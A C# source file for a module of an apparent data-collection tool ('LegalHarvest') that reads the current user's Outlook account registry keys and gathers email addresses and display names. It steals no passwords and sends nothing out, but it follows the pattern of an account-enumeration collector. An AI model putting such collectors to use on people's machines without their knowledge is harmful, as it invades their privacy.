using Microsoft.Win32;
using System;
using System.Collections.Generic;

namespace LegalHarvest.Modules
{
    public class OutlookAccountsModule : ICollectorModule
    {
        public string ModuleName => "OutlookAccounts";
        public bool CanExecute()
        {
            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts"))
                return key != null;
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            using (var accountsKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts"))
            {
                if (accountsKey != null)
                {
                    foreach (string subkeyName in accountsKey.GetSubKeyNames())
                    {
                        using (var accountKey = accountsKey.OpenSubKey(subkeyName))
                        {
                            string email = accountKey?.GetValue("SMTP Address") as string;
                            string displayName = accountKey?.GetValue("Display Name") as string;
                            if (!string.IsNullOrEmpty(email))
                                items.Add(new CollectedItem { Category = "Outlook", Name = displayName ?? email, Value = email, Timestamp = DateTime.Now });
                        }
                    }
                }
            }
            return items;
        }
    }
}
